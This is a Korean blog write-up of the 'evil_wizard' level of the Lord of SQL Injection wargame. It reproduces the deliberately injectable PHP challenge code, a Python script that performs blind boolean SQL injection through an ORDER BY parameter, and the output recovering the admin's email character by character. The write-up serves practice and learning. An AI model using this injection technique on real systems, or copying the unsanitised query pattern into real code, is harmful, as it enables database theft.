---
title: "[Lord of SQL Injection] LoS - evil_wizard 문제풀이"
date: 2018-08-24
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

`evil_wizard` 문제인데, 이 전에 `hell_fire` 문제랑 똑같이 생겼다.
주석을 보면 `same with hell_fire? really?`라고 적혀있는데, 뭐가 다른건지 모르겠다.  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------
query : select id,email,score from prob_evil_wizard where 1 order by
------------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}"; // same with hell_fire? really?
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysql_query($query);
  while(($result = mysql_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
  highlight_file(__FILE__);
?>
```

코드를 보면 이 전 문제인 `hell_fire`와 똑같다.
그런데 주석에 `same with hell_fire? really?`가 있는 것을 보니 뭔가 다른 부분이 있는 것 같았다.
그래서 `?order=id`를 입력 해 무슨 값이 들어있나 확인 해 보았다.  

|id|   |email|   |score|
|---|---|---|---|---|
|admin|   |**************|   |50|
|rubiya|   |rubiya805@gmail.com|   |100|

지난 문제에서는 `admin`의 `score`가 `200`이었어서, `order by` 뒤에 `id`를 넣을때와 `score`를 넣을 때가 결과가 달랐다.
그런데 이번에는 무슨 값을 넣어도 같은 결과가 나온다.
그래서 이 전 문제에서 사용했던 방법을 그대로 테스트 해 보았는데 너무 잘된다. ㅋㅋㅋ

뭔가... 이 전 문제는 내가 처음에 생각했던 방법대로 풀 수 있었던 문제인 것 같은데, 뭔가 문제가 망가진 것 같기도 하다.
아니면 내가 의도와 다르게 풀었거나...
어쨌든 그래서 그냥 이 전 문제 코드 그대로 가져다 풀었다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 40):
	try:
		query = url + "if((id='admin' and length(email)=" + str(i) + "), score, 9999)"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue
	if '<td>50</td></tr><tr><td>rubiya</td>' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(33, 128):
		try:
			query = url + "if((id='admin' and ord(substr(email, " + str(j) + ", 1))=" + str(i) + "), score, 9999)"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if '<td>50</td></tr><tr><td>rubiya</td>' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

패스워드 길이는 이 전 문제랑 살짝 달랐다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  30
[+] Find password
[+] Found 1 : a
[+] Found 2 : aa
[+] Found 3 : aas
[+] Found 4 : aasu
[+] Found 5 : aasup
[+] Found 6 : aasup3
[+] Found 7 : aasup3r
[+] Found 8 : aasup3r_
[+] Found 9 : aasup3r_s
[+] Found 10 : aasup3r_se
[+] Found 11 : aasup3r_sec
[+] Found 12 : aasup3r_secu
[+] Found 13 : aasup3r_secur
[+] Found 14 : aasup3r_secure
[+] Found 15 : aasup3r_secure_
[+] Found 16 : aasup3r_secure_e
[+] Found 17 : aasup3r_secure_em
[+] Found 18 : aasup3r_secure_ema
[+] Found 19 : aasup3r_secure_emai
[+] Found 20 : aasup3r_secure_email
[+] Found 21 : aasup3r_secure_email@
[+] Found 22 : aasup3r_secure_email@e
[+] Found 23 : aasup3r_secure_email@em
[+] Found 24 : aasup3r_secure_email@ema
[+] Found 25 : aasup3r_secure_email@emai
[+] Found 26 : aasup3r_secure_email@emai1
[+] Found 27 : aasup3r_secure_email@emai1.
[+] Found 28 : aasup3r_secure_email@emai1.c
[+] Found 29 : aasup3r_secure_email@emai1.co
[+] Found 30 : aasup3r_secure_email@emai1.com
[+] Found password :  aasup3r_secure_email@emai1.com
[+] End
```

결과로 나온 이메일 값을 아래와 같이 넘겨주었다.  

```plain
?email=aasup3r_secure_email@emai1.com
```

힣 코드 한개로 2문제 풀었다! 개꿀!  

```php
------------------------------------------------------------------------------------------
query : select id,email,score from prob_evil_wizard where 1 order by
------------------------------------------------------------------------------------------

EVIL_WIZARD Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}"; // same with hell_fire? really?
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysql_query($query);
  while(($result = mysql_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
  highlight_file(__FILE__);
?>
```

---

```plain
EVIL_WIZARD Clear!!
```